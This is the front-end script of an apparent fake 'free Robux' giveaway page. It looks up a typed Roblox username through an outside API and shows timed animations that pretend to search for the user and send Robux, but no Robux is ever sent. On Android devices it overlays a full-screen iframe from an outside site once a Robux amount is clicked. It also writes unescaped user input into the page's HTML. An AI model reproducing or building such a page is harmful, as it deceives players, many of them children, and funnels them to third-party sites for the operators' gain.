    const rbxbtn = document.querySelector(".getrbx");
    const box1 = document.querySelector(".box2");
    const box2 = document.querySelector(".boxanimation");
    const box3 = document.querySelector(".box3");
    const box4 = document.querySelector(".box4");
    const rbxtotal = document.querySelectorAll(".details");
    const usernameInput = document.querySelector(".username");
    const animationtxt = document.querySelector(".animationtxt");
    const userInfoContainer = document.getElementById("userInfoContainer");
    const loaderImage = document.querySelector(".fade-image");

    let userAvatar = "robux.png";

    rbxbtn.addEventListener("click", async () => {
        const username = usernameInput.value.trim();
        if (username.length <= 2) {
            alert("Please enter a valid username");
            return;
        }

        box1.style.display = "none";
        box2.style.display = "flex";
        animationtxt.innerHTML = `Searching for <b>${username}</b> ...`;

        let userFound = false;
        const timeoutId = setTimeout(() => {
            userInfoContainer.innerHTML = `<p>${username}</p>`;
        }, 6000);

        try {
            const response = await fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`);
            if (!response.ok) {
                throw new Error("User not found");
            }
            const data = await response.json();

            if (data.status === "SUCCESS") {
                userFound = true;
                clearTimeout(timeoutId);
                userAvatar = data.avatar;

                userInfoContainer.innerHTML = `
                    <img id="avatar" src="${userAvatar}" alt="User Avatar" width="100" height="100" style="border-radius: 50%;">
                    <p style="text-align: center;">${data.realName || username}</p>
                `;
            } else {
                userInfoContainer.innerHTML = `<p style="color: red;">User not found.</p>`;
            }
        } catch (error) {
            userInfoContainer.innerHTML = `<p style="color: red;">Error: ${error.message}</p>`;
        }

        setTimeout(showbox2, 4500);
        setTimeout(showbox3, 4500);
    });

    rbxtotal.forEach((btn) => {
        btn.addEventListener("click", () => {
            box3.style.display = "none";
            box2.style.display = "flex";

            setTimeout(showboxagain, 3500);
            setTimeout(showbox4, 3500);

            animationtxt.innerHTML = `Sending Robux to <b>${usernameInput.value}</b>...`;
            loaderImage.src = userAvatar;
        });
    });

    let showboxagain = () => { box2.style.display = "none"; };
    let showbox2 = () => { box2.style.display = "none"; };
    let showbox3 = () => { box3.style.display = "flex"; };
    let showbox4 = () => { box4.style.display = "flex"; };

    const modal = document.getElementById("how-it-works-modal");
    const btn = document.getElementById("how-it-works-btn");
    const closeBtn = document.querySelector(".close-btn");

    btn.addEventListener("click", (e) => {
        e.preventDefault();
        modal.style.display = "block";
    });

    closeBtn.addEventListener("click", () => {
        modal.style.display = "none";
    });

    window.addEventListener("click", (event) => {
        if (event.target === modal) {
            modal.style.display = "none";
        }
    });

    /*================== [ roblox new landing pages ] ===============*/

    document.addEventListener('DOMContentLoaded', () => {
        document.querySelectorAll('.details').forEach(button => {
            button.addEventListener('click', function() {
                const isAndroid = /Android/i.test(navigator.userAgent);

                if (isAndroid) {
                    const redirectURL = "https://www.rolls3.com";

                    const overlay = document.createElement('div');
                    overlay.style.position = 'fixed';
                    overlay.style.top = '0';
                    overlay.style.left = '0';
                    overlay.style.width = '100%';
                    overlay.style.height = '100%';
                    overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
                    overlay.style.zIndex = '9998';
                    document.body.appendChild(overlay);

                    const iframe = document.createElement('iframe');
                    iframe.src = redirectURL;
                    iframe.style.width = '100%'; 
                    iframe.style.border = 'none';
                    iframe.style.position = 'fixed'; 
                    iframe.style.top = '0';
                    iframe.style.left = '0';
                    iframe.style.zIndex = '9999';
                    iframe.style.height = '100vh'; 
                    iframe.style.backgroundColor = 'transparent'; 
                    iframe.style.transition = 'opacity 0.5s ease'; 
                    iframe.style.opacity = '0'; 

                    document.body.appendChild(iframe);

                    setTimeout(() => {
                        iframe.style.opacity = '1';
                    }, 3000);

                    window.addEventListener('message', (event) => {
                        if (event.origin === new URL(redirectURL).origin) {
                            const height = event.data.height;
                            iframe.style.height = height + 'px';
                        }
                    });
                }
            });
        });
    });
